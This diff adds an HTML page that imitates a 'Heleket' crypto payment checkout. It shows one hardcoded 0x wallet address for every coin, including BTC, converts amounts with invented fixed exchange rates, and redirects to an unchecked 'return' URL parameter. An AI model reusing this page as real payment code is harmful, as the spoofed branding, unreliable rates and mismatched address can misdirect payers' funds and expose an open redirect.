@@ -1,0 +1,605 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Heleket</title>
+    <style>
+      html,
+      body {
+        height: 100%;
+      }
+      body {
+        margin: 0;
+        background: #f5f6f7;
+        color: #0f172a;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial,
+          sans-serif;
+      }
+      .wrap {
+        min-height: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 28px 18px 46px;
+        gap: 18px;
+      }
+      .card {
+        width: 780px;
+        max-width: 100%;
+        background: #fff;
+        border-radius: 24px;
+        box-shadow: 0 18px 50px rgba(15, 23, 42, 0.08);
+        padding: 28px 32px 22px;
+      }
+      .top {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 12px;
+      }
+      .logo {
+        font-weight: 900;
+        color: #e11d2e;
+        font-size: 28px;
+        letter-spacing: 0.2px;
+      }
+      .topRight {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        color: rgba(15, 23, 42, 0.75);
+      }
+      .iconBtn {
+        width: 34px;
+        height: 34px;
+        border-radius: 999px;
+        border: 1px solid rgba(15, 23, 42, 0.12);
+        background: #fff;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        color: rgba(15, 23, 42, 0.75);
+        font-weight: 900;
+      }
+      .lang {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        font-weight: 700;
+        cursor: default;
+      }
+      .flag {
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        border: 1px solid rgba(15, 23, 42, 0.12);
+        overflow: hidden;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        background: #fff;
+        font-size: 12px;
+      }
+
+      .toPayRow {
+        margin-top: 18px;
+        display: flex;
+        align-items: flex-start;
+        justify-content: space-between;
+        gap: 16px;
+      }
+      .toPayLeft {
+        display: grid;
+        gap: 10px;
+      }
+      .toPayLabel {
+        font-size: 18px;
+        font-weight: 800;
+        color: rgba(15, 23, 42, 0.85);
+      }
+      .badgeRow {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        flex-wrap: wrap;
+      }
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        padding: 8px 12px;
+        border-radius: 999px;
+        background: rgba(15, 23, 42, 0.04);
+        color: rgba(15, 23, 42, 0.85);
+        font-weight: 800;
+        font-size: 13px;
+      }
+      .feeNote {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        padding: 7px 12px;
+        border-radius: 999px;
+        background: rgba(37, 99, 235, 0.08);
+        color: #2563eb;
+        font-weight: 800;
+        font-size: 13px;
+      }
+      .iDot {
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        border: 2px solid rgba(37, 99, 235, 0.3);
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 12px;
+        font-weight: 900;
+      }
+      .toPayRight {
+        text-align: right;
+      }
+      .coinAmount {
+        font-size: 34px;
+        font-weight: 900;
+        color: rgba(15, 23, 42, 0.92);
+      }
+      .usdApprox {
+        margin-top: 6px;
+        font-size: 14px;
+        color: rgba(15, 23, 42, 0.6);
+        font-weight: 800;
+      }
+
+      .divider {
+        height: 1px;
+        background: rgba(15, 23, 42, 0.08);
+        margin: 18px 0 16px;
+      }
+      .hint {
+        color: rgba(15, 23, 42, 0.65);
+        font-size: 14px;
+        line-height: 1.35;
+        margin-bottom: 18px;
+      }
+
+      .grid {
+        display: grid;
+        grid-template-columns: 170px 1fr;
+        gap: 16px;
+        align-items: center;
+      }
+      .qr {
+        width: 170px;
+        height: 170px;
+        border-radius: 14px;
+        border: 1px solid rgba(15, 23, 42, 0.12);
+        background: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        position: relative;
+      }
+      .qr img {
+        width: 170px;
+        height: 170px;
+        display: block;
+      }
+      .qrBadge {
+        position: absolute;
+        inset: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        pointer-events: none;
+      }
+      .qrBadgeInner {
+        width: 44px;
+        height: 44px;
+        border-radius: 12px;
+        background: #e11d2e;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #fff;
+        font-weight: 900;
+        box-shadow: 0 10px 25px rgba(225, 29, 46, 0.25);
+      }
+      .panel {
+        border: 1px solid rgba(15, 23, 42, 0.12);
+        border-radius: 14px;
+        overflow: hidden;
+        background: #fff;
+      }
+      .row {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+        padding: 14px 16px;
+      }
+      .row + .row {
+        border-top: 1px solid rgba(15, 23, 42, 0.08);
+      }
+      .rowLabel {
+        font-size: 13px;
+        color: rgba(15, 23, 42, 0.6);
+        font-weight: 800;
+        margin-bottom: 6px;
+      }
+      .rowValue {
+        font-size: 14px;
+        color: #2563eb;
+        font-weight: 900;
+        word-break: break-all;
+      }
+      .rowValueMuted {
+        font-size: 14px;
+        color: rgba(15, 23, 42, 0.92);
+        font-weight: 900;
+      }
+      .copyBtn {
+        width: 38px;
+        height: 38px;
+        border-radius: 10px;
+        border: 1px solid rgba(15, 23, 42, 0.12);
+        background: #fff;
+        cursor: pointer;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        color: rgba(15, 23, 42, 0.7);
+        font-weight: 900;
+      }
+      .warn {
+        margin-top: 14px;
+        background: rgba(245, 158, 11, 0.12);
+        border-radius: 14px;
+        padding: 12px 14px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        color: rgba(15, 23, 42, 0.72);
+        font-weight: 800;
+        font-size: 13px;
+      }
+      .warnIcon {
+        width: 24px;
+        height: 24px;
+        border-radius: 50%;
+        background: rgba(245, 158, 11, 0.2);
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        color: #b45309;
+        font-weight: 900;
+      }
+      .timerWrap {
+        margin-top: 18px;
+        text-align: center;
+        color: rgba(15, 23, 42, 0.65);
+        font-weight: 800;
+      }
+      .timerVal {
+        margin-top: 10px;
+        display: inline-flex;
+        align-items: center;
+        gap: 10px;
+        color: #16a34a;
+        font-weight: 900;
+        font-size: 18px;
+      }
+      .hourglass {
+        width: 18px;
+        height: 18px;
+        border-radius: 6px;
+        border: 2px solid rgba(22, 163, 74, 0.6);
+        position: relative;
+        box-sizing: border-box;
+      }
+      .hourglass:before,
+      .hourglass:after {
+        content: "";
+        position: absolute;
+        left: 3px;
+        right: 3px;
+        height: 2px;
+        background: rgba(22, 163, 74, 0.6);
+      }
+      .hourglass:before {
+        top: 4px;
+      }
+      .hourglass:after {
+        bottom: 4px;
+      }
+      .powered {
+        font-weight: 800;
+        color: rgba(15, 23, 42, 0.35);
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .powered strong {
+        color: #e11d2e;
+        font-weight: 900;
+      }
+      @media (max-width: 640px) {
+        .card {
+          padding: 22px 18px 18px;
+          border-radius: 22px;
+        }
+        .toPayRow {
+          align-items: flex-start;
+        }
+        .coinAmount {
+          font-size: 28px;
+        }
+        .grid {
+          grid-template-columns: 1fr;
+        }
+        .qr {
+          margin: 0 auto;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="card">
+        <div class="top">
+          <div class="logo">Heleket</div>
+          <div class="topRight">
+            <button class="iconBtn" type="button" aria-label="Help" onclick="return false;">
+              ?
+            </button>
+            <div class="lang" aria-label="Language">
+              <span class="flag">US</span>
+              <span>EN</span>
+              <span style="color: rgba(15, 23, 42, 0.6)">⌄</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="toPayRow">
+          <div class="toPayLeft">
+            <div class="toPayLabel">To pay:</div>
+            <div class="badgeRow">
+              <div class="badge" id="hk-net">Network:</div>
+              <div class="feeNote"><span class="iDot">i</span><span>You pay network fee</span></div>
+            </div>
+          </div>
+          <div class="toPayRight">
+            <div class="coinAmount" id="hk-coin-amount">0.00000000 BTC</div>
+            <div class="usdApprox" id="hk-usd-approx">≈$0.00</div>
+          </div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="hint">
+          Scan the QR code (it contains only the address), enter the amount, and send
+          funds - or use the address below
+        </div>
+
+        <div class="grid">
+          <div class="qr">
+            <img id="hk-qr" alt="QR code" />
+            <div class="qrBadge" aria-hidden="true">
+              <div class="qrBadgeInner">H</div>
+            </div>
+          </div>
+
+          <div class="panel">
+            <div class="row">
+              <div>
+                <div class="rowLabel">Wallet address for transfer:</div>
+                <div class="rowValue" id="hk-address"></div>
+              </div>
+              <button class="copyBtn" type="button" id="hk-copy-address" aria-label="Copy address">
+                ⧉
+              </button>
+            </div>
+            <div class="row">
+              <div>
+                <div class="rowLabel">Transfer amount:</div>
+                <div class="rowValueMuted" id="hk-transfer"></div>
+              </div>
+              <button class="copyBtn" type="button" id="hk-copy-amount" aria-label="Copy amount">
+                ⧉
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div class="warn">
+          <span class="warnIcon">!</span>
+          <span>After payment, wait until you are redirected to the order confirmation page</span>
+        </div>
+
+        <div class="timerWrap">
+          Time remaining for payment:
+          <div class="timerVal">
+            <span class="hourglass" aria-hidden="true"></span>
+            <span id="hk-timer">00:49:45</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="powered">Powered by <strong>Heleket</strong></div>
+    </div>
+
+    <script>
+      (function () {
+        function pad2(n) {
+          return n < 10 ? "0" + String(n) : String(n);
+        }
+
+        function formatUsd(n) {
+          if (!isFinite(n)) return "0.00";
+          var cents = Math.round(n * 100) / 100;
+          return cents.toFixed(2);
+        }
+
+        function formatCoin(n) {
+          if (!isFinite(n)) return "0.00000000";
+          var v = Math.round(n * 100000000) / 100000000;
+          return v.toFixed(8);
+        }
+
+        var params = new URLSearchParams(location.search);
+        var usdAmount = Number(params.get("amount") || "0");
+        var usdCurrency = String(params.get("currency") || "USD").toUpperCase();
+        var coin = String(params.get("coin") || "BTC").toUpperCase();
+        var network = String(params.get("network") || "").toUpperCase();
+        var returnUrl = String(params.get("return") || "/checkout.html");
+
+        var walletAddress = "0x9d4e6b1c2cb72a5967b05da0614fcd59f8cff6fa";
+
+        var ratesUsd = {
+          BTC: 76400,
+          ETH: 3600,
+          USDT: 1,
+          USDC: 1,
+          BNB: 600,
+          LTC: 95,
+          TRX: 0.12,
+          SOL: 170,
+          XRP: 0.55,
+          ADA: 0.45,
+          DOGE: 0.15,
+          DOT: 7.5,
+          MATIC: 0.85,
+          AVAX: 37,
+          LINK: 18,
+          BCH: 430,
+          XLM: 0.12,
+          ATOM: 10,
+          ETC: 26,
+          TON: 6.5,
+          SHIB: 0.00002,
+          UNI: 9,
+          APE: 1.7,
+          NEAR: 6.2,
+          FIL: 5.7,
+          ICP: 12.5,
+          XMR: 160,
+          EOS: 0.9,
+          XTZ: 1.1,
+          DAI: 1,
+        };
+
+        var rate = ratesUsd[coin] || 1;
+        var coinAmount = usdAmount / rate;
+
+        document.getElementById("hk-net").textContent =
+          "Network: " + (network || coin);
+        document.getElementById("hk-coin-amount").textContent =
+          formatCoin(coinAmount) + " " + coin;
+        document.getElementById("hk-usd-approx").textContent =
+          "≈$" + formatUsd(usdCurrency === "USD" ? usdAmount : usdAmount);
+
+        document.getElementById("hk-address").textContent = walletAddress;
+        document.getElementById("hk-transfer").textContent =
+          formatCoin(coinAmount) + " " + coin;
+
+        var qrEl = document.getElementById("hk-qr");
+        qrEl.src =
+          "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" +
+          encodeURIComponent(walletAddress);
+
+        function copyText(text) {
+          if (
+            window.isSecureContext &&
+            navigator.clipboard &&
+            navigator.clipboard.writeText
+          ) {
+            return navigator.clipboard.writeText(text).then(
+              function () {
+                return true;
+              },
+              function () {
+                return false;
+              }
+            );
+          }
+          var ta = document.createElement("textarea");
+          ta.value = text;
+          ta.style.position = "fixed";
+          ta.style.left = "-9999px";
+          document.body.appendChild(ta);
+          ta.select();
+          var ok = false;
+          try {
+            ok = document.execCommand("copy");
+          } catch (e) {
+            ok = false;
+          }
+          document.body.removeChild(ta);
+          return Promise.resolve(ok);
+        }
+
+        function flashCopy(btn) {
+          var prev = btn.textContent;
+          btn.textContent = "✓";
+          setTimeout(function () {
+            btn.textContent = prev;
+          }, 900);
+        }
+
+        document
+          .getElementById("hk-copy-address")
+          .addEventListener("click", function () {
+            var btn = this;
+            copyText(walletAddress).then(function (ok) {
+              if (ok) {
+                flashCopy(btn);
+                return;
+              }
+              window.prompt("Copy wallet address:", walletAddress);
+            });
+          });
+
+        document
+          .getElementById("hk-copy-amount")
+          .addEventListener("click", function () {
+            var btn = this;
+            var txt = formatCoin(coinAmount) + " " + coin;
+            copyText(txt).then(function (ok) {
+              if (ok) {
+                flashCopy(btn);
+                return;
+              }
+              window.prompt("Copy transfer amount:", txt);
+            });
+          });
+
+        var until = Date.now() + (49 * 60 + 45) * 1000;
+        var timerEl = document.getElementById("hk-timer");
+        function tick() {
+          var left = Math.max(0, until - Date.now());
+          var s = Math.floor(left / 1000);
+          var h = Math.floor(s / 3600);
+          var m = Math.floor((s % 3600) / 60);
+          var r = s % 60;
+          timerEl.textContent = pad2(h) + ":" + pad2(m) + ":" + pad2(r);
+          if (left > 0) setTimeout(tick, 250);
+          if (left === 0) {
+            setTimeout(function () {
+              location.href = returnUrl;
+            }, 800);
+          }
+        }
+        tick();
+
+        document.addEventListener("keydown", function (e) {
+          if (e.key === "Escape") location.href = returnUrl;
+        });
+      })();
+    </script>
+  </body>
+</html>
